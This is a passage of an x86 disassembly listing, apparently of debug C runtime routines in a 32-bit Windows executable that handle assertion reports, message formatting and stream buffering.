  402b26:	83 c8 ff             	or     $0xffffffff,%eax
  402b29:	e9 ad 02 00 00       	jmp    0x402ddb
  402b2e:	8b 55 10             	mov    0x10(%ebp),%edx
  402b31:	52                   	push   %edx
  402b32:	8b 45 0c             	mov    0xc(%ebp),%eax
  402b35:	50                   	push   %eax
  402b36:	68 30 03 42 00       	push   $0x420330
  402b3b:	8d 8d f8 df ff ff    	lea    -0x2008(%ebp),%ecx
  402b41:	51                   	push   %ecx
  402b42:	ff 15 c8 35 42 00    	call   *0x4235c8
  402b48:	83 c4 10             	add    $0x10,%esp
  402b4b:	8d 95 f8 df ff ff    	lea    -0x2008(%ebp),%edx
  402b51:	52                   	push   %edx
  402b52:	ff 15 a8 51 42 00    	call   *0x4251a8
  402b58:	68 c0 2c 42 00       	push   $0x422cc0
  402b5d:	ff 15 a4 51 42 00    	call   *0x4251a4
  402b63:	e8 d8 fd ff ff       	call   0x402940
  402b68:	83 c8 ff             	or     $0xffffffff,%eax
  402b6b:	e9 6b 02 00 00       	jmp    0x402ddb
  402b70:	83 7d 18 00          	cmpl   $0x0,0x18(%ebp)
  402b74:	74 37                	je     0x402bad
  402b76:	8b 85 fc ef ff ff    	mov    -0x1004(%ebp),%eax
  402b7c:	50                   	push   %eax
  402b7d:	8b 4d 18             	mov    0x18(%ebp),%ecx
  402b80:	51                   	push   %ecx
  402b81:	68 ed 0f 00 00       	push   $0xfed
  402b86:	8d 95 00 f0 ff ff    	lea    -0x1000(%ebp),%edx
  402b8c:	52                   	push   %edx
  402b8d:	e8 5e 47 00 00       	call   0x4072f0
  402b92:	83 c4 10             	add    $0x10,%esp
  402b95:	85 c0                	test   %eax,%eax
  402b97:	7d 14                	jge    0x402bad
  402b99:	68 04 03 42 00       	push   $0x420304
  402b9e:	8d 85 00 f0 ff ff    	lea    -0x1000(%ebp),%eax
  402ba4:	50                   	push   %eax
  402ba5:	e8 56 46 00 00       	call   0x407200
  402baa:	83 c4 08             	add    $0x8,%esp
  402bad:	83 7d 08 02          	cmpl   $0x2,0x8(%ebp)
  402bb1:	75 32                	jne    0x402be5
  402bb3:	83 7d 18 00          	cmpl   $0x0,0x18(%ebp)
  402bb7:	74 0c                	je     0x402bc5
  402bb9:	c7 85 d8 cf ff ff f0 	movl   $0x4202f0,-0x3028(%ebp)
  402bc0:	02 42 00 
  402bc3:	eb 0a                	jmp    0x402bcf
  402bc5:	c7 85 d8 cf ff ff dc 	movl   $0x4202dc,-0x3028(%ebp)
  402bcc:	02 42 00 
  402bcf:	8b 8d d8 cf ff ff    	mov    -0x3028(%ebp),%ecx
  402bd5:	51                   	push   %ecx
  402bd6:	8d 95 f8 cf ff ff    	lea    -0x3008(%ebp),%edx
  402bdc:	52                   	push   %edx
  402bdd:	e8 1e 46 00 00       	call   0x407200
  402be2:	83 c4 08             	add    $0x8,%esp
  402be5:	8d 85 00 f0 ff ff    	lea    -0x1000(%ebp),%eax
  402beb:	50                   	push   %eax
  402bec:	8d 8d f8 cf ff ff    	lea    -0x3008(%ebp),%ecx
  402bf2:	51                   	push   %ecx
  402bf3:	e8 18 46 00 00       	call   0x407210
  402bf8:	83 c4 08             	add    $0x8,%esp
  402bfb:	83 7d 08 02          	cmpl   $0x2,0x8(%ebp)
  402bff:	75 39                	jne    0x402c3a
  402c01:	8b 55 08             	mov    0x8(%ebp),%edx
  402c04:	8b 04 95 c4 2c 42 00 	mov    0x422cc4(,%edx,4),%eax
  402c0b:	83 e0 01             	and    $0x1,%eax
  402c0e:	85 c0                	test   %eax,%eax
  402c10:	74 14                	je     0x402c26
  402c12:	68 d8 02 42 00       	push   $0x4202d8
  402c17:	8d 8d f8 cf ff ff    	lea    -0x3008(%ebp),%ecx
  402c1d:	51                   	push   %ecx
  402c1e:	e8 ed 45 00 00       	call   0x407210
  402c23:	83 c4 08             	add    $0x8,%esp
  402c26:	68 d4 02 42 00       	push   $0x4202d4
  402c2b:	8d 95 f8 cf ff ff    	lea    -0x3008(%ebp),%edx
  402c31:	52                   	push   %edx
  402c32:	e8 d9 45 00 00       	call   0x407210
  402c37:	83 c4 08             	add    $0x8,%esp
  402c3a:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  402c3e:	74 42                	je     0x402c82
  402c40:	8d 85 f8 cf ff ff    	lea    -0x3008(%ebp),%eax
  402c46:	50                   	push   %eax
  402c47:	8b 4d 10             	mov    0x10(%ebp),%ecx
  402c4a:	51                   	push   %ecx
  402c4b:	8b 55 0c             	mov    0xc(%ebp),%edx
  402c4e:	52                   	push   %edx
  402c4f:	68 c8 02 42 00       	push   $0x4202c8
  402c54:	68 00 10 00 00       	push   $0x1000
  402c59:	8d 85 f8 df ff ff    	lea    -0x2008(%ebp),%eax
  402c5f:	50                   	push   %eax
  402c60:	e8 9b 44 00 00       	call   0x407100
  402c65:	83 c4 18             	add    $0x18,%esp
  402c68:	85 c0                	test   %eax,%eax
  402c6a:	7d 14                	jge    0x402c80
  402c6c:	68 04 03 42 00       	push   $0x420304
  402c71:	8d 8d f8 df ff ff    	lea    -0x2008(%ebp),%ecx
  402c77:	51                   	push   %ecx
  402c78:	e8 83 45 00 00       	call   0x407200
  402c7d:	83 c4 08             	add    $0x8,%esp
  402c80:	eb 16                	jmp    0x402c98
  402c82:	8d 95 f8 cf ff ff    	lea    -0x3008(%ebp),%edx
  402c88:	52                   	push   %edx
  402c89:	8d 85 f8 df ff ff    	lea    -0x2008(%ebp),%eax
  402c8f:	50                   	push   %eax
  402c90:	e8 6b 45 00 00       	call   0x407200
  402c95:	83 c4 08             	add    $0x8,%esp
  402c98:	83 3d c0 3b 42 00 00 	cmpl   $0x0,0x423bc0
  402c9f:	74 3b                	je     0x402cdc
  402ca1:	8d 8d f8 ef ff ff    	lea    -0x1008(%ebp),%ecx
  402ca7:	51                   	push   %ecx
  402ca8:	8d 95 f8 df ff ff    	lea    -0x2008(%ebp),%edx
  402cae:	52                   	push   %edx
  402caf:	8b 45 08             	mov    0x8(%ebp),%eax
  402cb2:	50                   	push   %eax
  402cb3:	ff 15 c0 3b 42 00    	call   *0x423bc0
  402cb9:	83 c4 0c             	add    $0xc,%esp
  402cbc:	85 c0                	test   %eax,%eax
  402cbe:	74 1c                	je     0x402cdc
  402cc0:	83 7d 08 02          	cmpl   $0x2,0x8(%ebp)
  402cc4:	75 0b                	jne    0x402cd1
  402cc6:	68 c0 2c 42 00       	push   $0x422cc0
  402ccb:	ff 15 a4 51 42 00    	call   *0x4251a4
  402cd1:	8b 85 f8 ef ff ff    	mov    -0x1008(%ebp),%eax
  402cd7:	e9 ff 00 00 00       	jmp    0x402ddb
  402cdc:	8b 4d 08             	mov    0x8(%ebp),%ecx
  402cdf:	8b 14 8d c4 2c 42 00 	mov    0x422cc4(,%ecx,4),%edx
  402ce6:	83 e2 01             	and    $0x1,%edx
  402ce9:	85 d2                	test   %edx,%edx
  402ceb:	74 3e                	je     0x402d2b
  402ced:	8b 45 08             	mov    0x8(%ebp),%eax
  402cf0:	83 3c 85 d0 2c 42 00 	cmpl   $0xffffffff,0x422cd0(,%eax,4)
  402cf7:	ff 
  402cf8:	74 31                	je     0x402d2b
  402cfa:	6a 00                	push   $0x0
  402cfc:	8d 8d f0 cf ff ff    	lea    -0x3010(%ebp),%ecx
  402d02:	51                   	push   %ecx
  402d03:	8d 95 f8 df ff ff    	lea    -0x2008(%ebp),%edx
  402d09:	52                   	push   %edx
  402d0a:	e8 81 08 00 00       	call   0x403590
  402d0f:	83 c4 04             	add    $0x4,%esp
  402d12:	50                   	push   %eax
  402d13:	8d 85 f8 df ff ff    	lea    -0x2008(%ebp),%eax
  402d19:	50                   	push   %eax
  402d1a:	8b 4d 08             	mov    0x8(%ebp),%ecx
  402d1d:	8b 14 8d d0 2c 42 00 	mov    0x422cd0(,%ecx,4),%edx
  402d24:	52                   	push   %edx
  402d25:	ff 15 a0 51 42 00    	call   *0x4251a0
  402d2b:	8b 45 08             	mov    0x8(%ebp),%eax
  402d2e:	8b 0c 85 c4 2c 42 00 	mov    0x422cc4(,%eax,4),%ecx
  402d35:	83 e1 02             	and    $0x2,%ecx
  402d38:	85 c9                	test   %ecx,%ecx
  402d3a:	74 0d                	je     0x402d49
  402d3c:	8d 95 f8 df ff ff    	lea    -0x2008(%ebp),%edx
  402d42:	52                   	push   %edx
  402d43:	ff 15 a8 51 42 00    	call   *0x4251a8
  402d49:	8b 45 08             	mov    0x8(%ebp),%eax
  402d4c:	8b 0c 85 c4 2c 42 00 	mov    0x422cc4(,%eax,4),%ecx
  402d53:	83 e1 04             	and    $0x4,%ecx
  402d56:	85 c9                	test   %ecx,%ecx
  402d58:	74 6e                	je     0x402dc8
  402d5a:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  402d5e:	74 1d                	je     0x402d7d
  402d60:	6a 0a                	push   $0xa
  402d62:	8d 95 dc cf ff ff    	lea    -0x3024(%ebp),%edx
  402d68:	52                   	push   %edx
  402d69:	8b 45 10             	mov    0x10(%ebp),%eax
  402d6c:	50                   	push   %eax
  402d6d:	e8 9e 40 00 00       	call   0x406e10
  402d72:	83 c4 0c             	add    $0xc,%esp
  402d75:	89 85 d4 cf ff ff    	mov    %eax,-0x302c(%ebp)
  402d7b:	eb 0a                	jmp    0x402d87
  402d7d:	c7 85 d4 cf ff ff 00 	movl   $0x0,-0x302c(%ebp)
  402d84:	00 00 00 
  402d87:	8d 8d 00 f0 ff ff    	lea    -0x1000(%ebp),%ecx
  402d8d:	51                   	push   %ecx
  402d8e:	8b 55 14             	mov    0x14(%ebp),%edx
  402d91:	52                   	push   %edx
  402d92:	8b 85 d4 cf ff ff    	mov    -0x302c(%ebp),%eax
  402d98:	50                   	push   %eax
  402d99:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  402d9c:	51                   	push   %ecx
  402d9d:	8b 55 08             	mov    0x8(%ebp),%edx
  402da0:	52                   	push   %edx
  402da1:	e8 3a 00 00 00       	call   0x402de0
  402da6:	83 c4 14             	add    $0x14,%esp
  402da9:	89 85 f8 ef ff ff    	mov    %eax,-0x1008(%ebp)
  402daf:	83 7d 08 02          	cmpl   $0x2,0x8(%ebp)
  402db3:	75 0b                	jne    0x402dc0
  402db5:	68 c0 2c 42 00       	push   $0x422cc0
  402dba:	ff 15 a4 51 42 00    	call   *0x4251a4
  402dc0:	8b 85 f8 ef ff ff    	mov    -0x1008(%ebp),%eax
  402dc6:	eb 13                	jmp    0x402ddb
  402dc8:	83 7d 08 02          	cmpl   $0x2,0x8(%ebp)
  402dcc:	75 0b                	jne    0x402dd9
  402dce:	68 c0 2c 42 00       	push   $0x422cc0
  402dd3:	ff 15 a4 51 42 00    	call   *0x4251a4
  402dd9:	33 c0                	xor    %eax,%eax
  402ddb:	5f                   	pop    %edi
  402ddc:	8b e5                	mov    %ebp,%esp
  402dde:	5d                   	pop    %ebp
  402ddf:	c3                   	ret    
  402de0:	55                   	push   %ebp
  402de1:	8b ec                	mov    %esp,%ebp
  402de3:	b8 38 11 00 00       	mov    $0x1138,%eax
  402de8:	e8 03 46 00 00       	call   0x4073f0
  402ded:	83 7d 18 00          	cmpl   $0x0,0x18(%ebp)
  402df1:	75 25                	jne    0x402e18
  402df3:	68 c0 04 42 00       	push   $0x4204c0
  402df8:	6a 00                	push   $0x0
  402dfa:	68 da 01 00 00       	push   $0x1da
  402dff:	68 b4 04 42 00       	push   $0x4204b4
  402e04:	6a 02                	push   $0x2
  402e06:	e8 45 fc ff ff       	call   0x402a50
  402e0b:	83 c4 14             	add    $0x14,%esp
  402e0e:	83 f8 01             	cmp    $0x1,%eax
  402e11:	75 05                	jne    0x402e18
  402e13:	e8 28 fb ff ff       	call   0x402940
  402e18:	33 c0                	xor    %eax,%eax
  402e1a:	85 c0                	test   %eax,%eax
  402e1c:	75 cf                	jne    0x402ded
  402e1e:	68 04 01 00 00       	push   $0x104
  402e23:	8d 8d f8 fe ff ff    	lea    -0x108(%ebp),%ecx
  402e29:	51                   	push   %ecx
  402e2a:	6a 00                	push   $0x0
  402e2c:	ff 15 b8 51 42 00    	call   *0x4251b8
  402e32:	85 c0                	test   %eax,%eax
  402e34:	75 14                	jne    0x402e4a
  402e36:	68 9c 04 42 00       	push   $0x42049c
  402e3b:	8d 95 f8 fe ff ff    	lea    -0x108(%ebp),%edx
  402e41:	52                   	push   %edx
  402e42:	e8 b9 43 00 00       	call   0x407200
  402e47:	83 c4 08             	add    $0x8,%esp
  402e4a:	8d 85 f8 fe ff ff    	lea    -0x108(%ebp),%eax
  402e50:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402e53:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  402e56:	51                   	push   %ecx
  402e57:	e8 34 07 00 00       	call   0x403590
  402e5c:	83 c4 04             	add    $0x4,%esp
  402e5f:	83 f8 40             	cmp    $0x40,%eax
  402e62:	76 29                	jbe    0x402e8d
  402e64:	8b 55 fc             	mov    -0x4(%ebp),%edx
  402e67:	52                   	push   %edx
  402e68:	e8 23 07 00 00       	call   0x403590
  402e6d:	83 c4 04             	add    $0x4,%esp
  402e70:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  402e73:	8d 54 01 c0          	lea    -0x40(%ecx,%eax,1),%edx
  402e77:	89 55 fc             	mov    %edx,-0x4(%ebp)
  402e7a:	6a 03                	push   $0x3
  402e7c:	68 98 04 42 00       	push   $0x420498
  402e81:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402e84:	50                   	push   %eax
  402e85:	e8 86 4a 00 00       	call   0x407910
  402e8a:	83 c4 0c             	add    $0xc,%esp
  402e8d:	8b 4d 14             	mov    0x14(%ebp),%ecx
  402e90:	89 8d f0 ee ff ff    	mov    %ecx,-0x1110(%ebp)
  402e96:	83 bd f0 ee ff ff 00 	cmpl   $0x0,-0x1110(%ebp)
  402e9d:	74 49                	je     0x402ee8
  402e9f:	8b 95 f0 ee ff ff    	mov    -0x1110(%ebp),%edx
  402ea5:	52                   	push   %edx
  402ea6:	e8 e5 06 00 00       	call   0x403590
  402eab:	83 c4 04             	add    $0x4,%esp
  402eae:	83 f8 40             	cmp    $0x40,%eax
  402eb1:	76 35                	jbe    0x402ee8
  402eb3:	8b 85 f0 ee ff ff    	mov    -0x1110(%ebp),%eax
  402eb9:	50                   	push   %eax
  402eba:	e8 d1 06 00 00       	call   0x403590
  402ebf:	83 c4 04             	add    $0x4,%esp
  402ec2:	8b 8d f0 ee ff ff    	mov    -0x1110(%ebp),%ecx
  402ec8:	8d 54 01 c0          	lea    -0x40(%ecx,%eax,1),%edx
  402ecc:	89 95 f0 ee ff ff    	mov    %edx,-0x1110(%ebp)
  402ed2:	6a 03                	push   $0x3
  402ed4:	68 98 04 42 00       	push   $0x420498
  402ed9:	8b 85 f0 ee ff ff    	mov    -0x1110(%ebp),%eax
  402edf:	50                   	push   %eax
  402ee0:	e8 2b 4a 00 00       	call   0x407910
  402ee5:	83 c4 0c             	add    $0xc,%esp
  402ee8:	83 7d 08 02          	cmpl   $0x2,0x8(%ebp)
  402eec:	75 0c                	jne    0x402efa
  402eee:	c7 85 ec ee ff ff 24 	movl   $0x420424,-0x1114(%ebp)
  402ef5:	04 42 00 
  402ef8:	eb 0a                	jmp    0x402f04
  402efa:	c7 85 ec ee ff ff f0 	movl   $0x4200f0,-0x1114(%ebp)
  402f01:	00 42 00 
  402f04:	8b 4d 18             	mov    0x18(%ebp),%ecx
  402f07:	0f be 11             	movsbl (%ecx),%edx
  402f0a:	85 d2                	test   %edx,%edx
  402f0c:	74 0b                	je     0x402f19
  402f0e:	8b 45 18             	mov    0x18(%ebp),%eax
  402f11:	89 85 e8 ee ff ff    	mov    %eax,-0x1118(%ebp)
  402f17:	eb 0a                	jmp    0x402f23
  402f19:	c7 85 e8 ee ff ff f0 	movl   $0x4200f0,-0x1118(%ebp)
  402f20:	00 42 00 
  402f23:	8b 4d 18             	mov    0x18(%ebp),%ecx
  402f26:	0f be 11             	movsbl (%ecx),%edx
  402f29:	85 d2                	test   %edx,%edx
  402f2b:	74 12                	je     0x402f3f
  402f2d:	83 7d 08 02          	cmpl   $0x2,0x8(%ebp)
  402f31:	75 0c                	jne    0x402f3f
  402f33:	c7 85 e4 ee ff ff 14 	movl   $0x420414,-0x111c(%ebp)
  402f3a:	04 42 00 
  402f3d:	eb 0a                	jmp    0x402f49
  402f3f:	c7 85 e4 ee ff ff f0 	movl   $0x4200f0,-0x111c(%ebp)
  402f46:	00 42 00 
  402f49:	8b 45 18             	mov    0x18(%ebp),%eax
  402f4c:	0f be 08             	movsbl (%eax),%ecx
  402f4f:	85 c9                	test   %ecx,%ecx
  402f51:	74 0c                	je     0x402f5f
  402f53:	c7 85 e0 ee ff ff 10 	movl   $0x420410,-0x1120(%ebp)
  402f5a:	04 42 00 
  402f5d:	eb 0a                	jmp    0x402f69
  402f5f:	c7 85 e0 ee ff ff f0 	movl   $0x4200f0,-0x1120(%ebp)
  402f66:	00 42 00 
  402f69:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  402f6d:	74 0b                	je     0x402f7a
  402f6f:	8b 55 10             	mov    0x10(%ebp),%edx
  402f72:	89 95 dc ee ff ff    	mov    %edx,-0x1124(%ebp)
  402f78:	eb 0a                	jmp    0x402f84
  402f7a:	c7 85 dc ee ff ff f0 	movl   $0x4200f0,-0x1124(%ebp)
  402f81:	00 42 00 
  402f84:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  402f88:	74 0c                	je     0x402f96
  402f8a:	c7 85 d8 ee ff ff 08 	movl   $0x420408,-0x1128(%ebp)
  402f91:	04 42 00 
  402f94:	eb 0a                	jmp    0x402fa0
  402f96:	c7 85 d8 ee ff ff f0 	movl   $0x4200f0,-0x1128(%ebp)
  402f9d:	00 42 00 
  402fa0:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  402fa4:	74 0b                	je     0x402fb1
  402fa6:	8b 45 0c             	mov    0xc(%ebp),%eax
  402fa9:	89 85 d4 ee ff ff    	mov    %eax,-0x112c(%ebp)
  402faf:	eb 0a                	jmp    0x402fbb
  402fb1:	c7 85 d4 ee ff ff f0 	movl   $0x4200f0,-0x112c(%ebp)
  402fb8:	00 42 00 
  402fbb:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  402fbf:	74 0c                	je     0x402fcd
  402fc1:	c7 85 d0 ee ff ff 00 	movl   $0x420400,-0x1130(%ebp)
  402fc8:	04 42 00 
  402fcb:	eb 0a                	jmp    0x402fd7
  402fcd:	c7 85 d0 ee ff ff f0 	movl   $0x4200f0,-0x1130(%ebp)
  402fd4:	00 42 00 
  402fd7:	83 bd f0 ee ff ff 00 	cmpl   $0x0,-0x1110(%ebp)
  402fde:	74 0e                	je     0x402fee
  402fe0:	8b 8d f0 ee ff ff    	mov    -0x1110(%ebp),%ecx
  402fe6:	89 8d cc ee ff ff    	mov    %ecx,-0x1134(%ebp)
  402fec:	eb 0a                	jmp    0x402ff8
  402fee:	c7 85 cc ee ff ff f0 	movl   $0x4200f0,-0x1134(%ebp)
  402ff5:	00 42 00 
  402ff8:	83 bd f0 ee ff ff 00 	cmpl   $0x0,-0x1110(%ebp)
  402fff:	74 0c                	je     0x40300d
  403001:	c7 85 c8 ee ff ff f4 	movl   $0x4203f4,-0x1138(%ebp)
  403008:	03 42 00 
  40300b:	eb 0a                	jmp    0x403017
  40300d:	c7 85 c8 ee ff ff f0 	movl   $0x4200f0,-0x1138(%ebp)
  403014:	00 42 00 
  403017:	8b 95 ec ee ff ff    	mov    -0x1114(%ebp),%edx
  40301d:	52                   	push   %edx
  40301e:	8b 85 e8 ee ff ff    	mov    -0x1118(%ebp),%eax
  403024:	50                   	push   %eax
  403025:	8b 8d e4 ee ff ff    	mov    -0x111c(%ebp),%ecx
  40302b:	51                   	push   %ecx
  40302c:	8b 95 e0 ee ff ff    	mov    -0x1120(%ebp),%edx
  403032:	52                   	push   %edx
  403033:	8b 85 dc ee ff ff    	mov    -0x1124(%ebp),%eax
  403039:	50                   	push   %eax
  40303a:	8b 8d d8 ee ff ff    	mov    -0x1128(%ebp),%ecx
  403040:	51                   	push   %ecx
  403041:	8b 95 d4 ee ff ff    	mov    -0x112c(%ebp),%edx
  403047:	52                   	push   %edx
  403048:	8b 85 d0 ee ff ff    	mov    -0x1130(%ebp),%eax
  40304e:	50                   	push   %eax
  40304f:	8b 8d cc ee ff ff    	mov    -0x1134(%ebp),%ecx
  403055:	51                   	push   %ecx
  403056:	8b 95 c8 ee ff ff    	mov    -0x1138(%ebp),%edx
  40305c:	52                   	push   %edx
  40305d:	8b 45 fc             	mov    -0x4(%ebp),%eax
  403060:	50                   	push   %eax
  403061:	8b 4d 08             	mov    0x8(%ebp),%ecx
  403064:	8b 14 8d dc 2c 42 00 	mov    0x422cdc(,%ecx,4),%edx
  40306b:	52                   	push   %edx
  40306c:	68 a0 03 42 00       	push   $0x4203a0
  403071:	68 00 10 00 00       	push   $0x1000
  403076:	8d 85 f4 ee ff ff    	lea    -0x110c(%ebp),%eax
  40307c:	50                   	push   %eax
  40307d:	e8 7e 40 00 00       	call   0x407100
  403082:	83 c4 3c             	add    $0x3c,%esp
  403085:	85 c0                	test   %eax,%eax
  403087:	7d 14                	jge    0x40309d
  403089:	68 04 03 42 00       	push   $0x420304
  40308e:	8d 8d f4 ee ff ff    	lea    -0x110c(%ebp),%ecx
  403094:	51                   	push   %ecx
  403095:	e8 66 41 00 00       	call   0x407200
  40309a:	83 c4 08             	add    $0x8,%esp
  40309d:	68 12 20 01 00       	push   $0x12012
  4030a2:	68 7c 03 42 00       	push   $0x42037c
  4030a7:	8d 95 f4 ee ff ff    	lea    -0x110c(%ebp),%edx
  4030ad:	52                   	push   %edx
  4030ae:	e8 9d 47 00 00       	call   0x407850
  4030b3:	83 c4 0c             	add    $0xc,%esp
  4030b6:	89 85 f4 fe ff ff    	mov    %eax,-0x10c(%ebp)
  4030bc:	83 bd f4 fe ff ff 03 	cmpl   $0x3,-0x10c(%ebp)
  4030c3:	75 11                	jne    0x4030d6
  4030c5:	6a 16                	push   $0x16
  4030c7:	e8 64 45 00 00       	call   0x407630
  4030cc:	83 c4 04             	add    $0x4,%esp
  4030cf:	6a 03                	push   $0x3
  4030d1:	e8 9a 05 00 00       	call   0x403670
  4030d6:	83 bd f4 fe ff ff 04 	cmpl   $0x4,-0x10c(%ebp)
  4030dd:	75 07                	jne    0x4030e6
  4030df:	b8 01 00 00 00       	mov    $0x1,%eax
  4030e4:	eb 02                	jmp    0x4030e8
  4030e6:	33 c0                	xor    %eax,%eax
  4030e8:	8b e5                	mov    %ebp,%esp
  4030ea:	5d                   	pop    %ebp
  4030eb:	c3                   	ret    
  4030ec:	cc                   	int3   
  4030ed:	cc                   	int3   
  4030ee:	cc                   	int3   
  4030ef:	cc                   	int3   
  4030f0:	55                   	push   %ebp
  4030f1:	8b ec                	mov    %esp,%ebp
  4030f3:	83 ec 14             	sub    $0x14,%esp
  4030f6:	53                   	push   %ebx
  4030f7:	56                   	push   %esi
  4030f8:	57                   	push   %edi
  4030f9:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  4030fd:	75 1e                	jne    0x40311d
  4030ff:	68 e8 01 42 00       	push   $0x4201e8
  403104:	6a 00                	push   $0x0
  403106:	6a 69                	push   $0x69
  403108:	68 18 05 42 00       	push   $0x420518
  40310d:	6a 02                	push   $0x2
  40310f:	e8 3c f9 ff ff       	call   0x402a50
  403114:	83 c4 14             	add    $0x14,%esp
  403117:	83 f8 01             	cmp    $0x1,%eax
  40311a:	75 01                	jne    0x40311d
  40311c:	cc                   	int3   
  40311d:	33 c0                	xor    %eax,%eax
  40311f:	85 c0                	test   %eax,%eax
  403121:	75 d6                	jne    0x4030f9
  403123:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  403126:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  403129:	8b 55 f8             	mov    -0x8(%ebp),%edx
  40312c:	8b 42 10             	mov    0x10(%edx),%eax
  40312f:	89 45 f0             	mov    %eax,-0x10(%ebp)
  403132:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  403135:	8b 51 0c             	mov    0xc(%ecx),%edx
  403138:	81 e2 82 00 00 00    	and    $0x82,%edx
  40313e:	85 d2                	test   %edx,%edx
  403140:	74 0d                	je     0x40314f
  403142:	8b 45 f8             	mov    -0x8(%ebp),%eax
  403145:	8b 48 0c             	mov    0xc(%eax),%ecx
  403148:	83 e1 40             	and    $0x40,%ecx
  40314b:	85 c9                	test   %ecx,%ecx
  40314d:	74 16                	je     0x403165
  40314f:	8b 55 f8             	mov    -0x8(%ebp),%edx
  403152:	8b 42 0c             	mov    0xc(%edx),%eax
  403155:	0c 20                	or     $0x20,%al
  403157:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  40315a:	89 41 0c             	mov    %eax,0xc(%ecx)
  40315d:	83 c8 ff             	or     $0xffffffff,%eax
  403160:	e9 f6 01 00 00       	jmp    0x40335b
  403165:	8b 55 f8             	mov    -0x8(%ebp),%edx
  403168:	8b 42 0c             	mov    0xc(%edx),%eax
  40316b:	83 e0 01             	and    $0x1,%eax
  40316e:	85 c0                	test   %eax,%eax
  403170:	74 4a                	je     0x4031bc
  403172:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  403175:	c7 41 04 00 00 00 00 	movl   $0x0,0x4(%ecx)
  40317c:	8b 55 f8             	mov    -0x8(%ebp),%edx
  40317f:	8b 42 0c             	mov    0xc(%edx),%eax
  403182:	83 e0 10             	and    $0x10,%eax
  403185:	85 c0                	test   %eax,%eax
  403187:	74 1c                	je     0x4031a5
  403189:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  40318c:	8b 55 f8             	mov    -0x8(%ebp),%edx
  40318f:	8b 42 08             	mov    0x8(%edx),%eax
  403192:	89 01                	mov    %eax,(%ecx)
  403194:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  403197:	8b 51 0c             	mov    0xc(%ecx),%edx
  40319a:	83 e2 fe             	and    $0xfffffffe,%edx
  40319d:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4031a0:	89 50 0c             	mov    %edx,0xc(%eax)
  4031a3:	eb 17                	jmp    0x4031bc
  4031a5:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  4031a8:	8b 51 0c             	mov    0xc(%ecx),%edx
  4031ab:	83 ca 20             	or     $0x20,%edx
  4031ae:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4031b1:	89 50 0c             	mov    %edx,0xc(%eax)
  4031b4:	83 c8 ff             	or     $0xffffffff,%eax
  4031b7:	e9 9f 01 00 00       	jmp    0x40335b
  4031bc:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  4031bf:	8b 51 0c             	mov    0xc(%ecx),%edx
  4031c2:	83 ca 02             	or     $0x2,%edx
  4031c5:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4031c8:	89 50 0c             	mov    %edx,0xc(%eax)
  4031cb:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  4031ce:	8b 51 0c             	mov    0xc(%ecx),%edx
  4031d1:	83 e2 ef             	and    $0xffffffef,%edx
  4031d4:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4031d7:	89 50 0c             	mov    %edx,0xc(%eax)
  4031da:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  4031dd:	c7 41 04 00 00 00 00 	movl   $0x0,0x4(%ecx)
  4031e4:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  4031eb:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4031ee:	89 55 f4             	mov    %edx,-0xc(%ebp)
  4031f1:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4031f4:	8b 48 0c             	mov    0xc(%eax),%ecx
  4031f7:	81 e1 0c 01 00 00    	and    $0x10c,%ecx
  4031fd:	85 c9                	test   %ecx,%ecx
  4031ff:	75 2e                	jne    0x40322f
  403201:	81 7d f8 60 2a 42 00 	cmpl   $0x422a60,-0x8(%ebp)
  403208:	74 09                	je     0x403213
  40320a:	81 7d f8 80 2a 42 00 	cmpl   $0x422a80,-0x8(%ebp)
  403211:	75 10                	jne    0x403223
  403213:	8b 55 f0             	mov    -0x10(%ebp),%edx
  403216:	52                   	push   %edx
  403217:	e8 74 37 00 00       	call   0x406990
  40321c:	83 c4 04             	add    $0x4,%esp
  40321f:	85 c0                	test   %eax,%eax
  403221:	75 0c                	jne    0x40322f
  403223:	8b 45 f8             	mov    -0x8(%ebp),%eax
  403226:	50                   	push   %eax
  403227:	e8 84 4b 00 00       	call   0x407db0
  40322c:	83 c4 04             	add    $0x4,%esp
  40322f:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  403232:	8b 51 0c             	mov    0xc(%ecx),%edx
  403235:	81 e2 08 01 00 00    	and    $0x108,%edx
  40323b:	85 d2                	test   %edx,%edx
  40323d:	0f 84 d6 00 00 00    	je     0x403319
  403243:	8b 45 f8             	mov    -0x8(%ebp),%eax
  403246:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  403249:	8b 10                	mov    (%eax),%edx
  40324b:	2b 51 08             	sub    0x8(%ecx),%edx
  40324e:	85 d2                	test   %edx,%edx
  403250:	7d 21                	jge    0x403273
  403252:	68 d8 04 42 00       	push   $0x4204d8
  403257:	6a 00                	push   $0x0
  403259:	68 a0 00 00 00       	push   $0xa0
  40325e:	68 18 05 42 00       	push   $0x420518
  403263:	6a 02                	push   $0x2
  403265:	e8 e6 f7 ff ff       	call   0x402a50
  40326a:	83 c4 14             	add    $0x14,%esp
  40326d:	83 f8 01             	cmp    $0x1,%eax
  403270:	75 01                	jne    0x403273
  403272:	cc                   	int3   
  403273:	33 c0                	xor    %eax,%eax
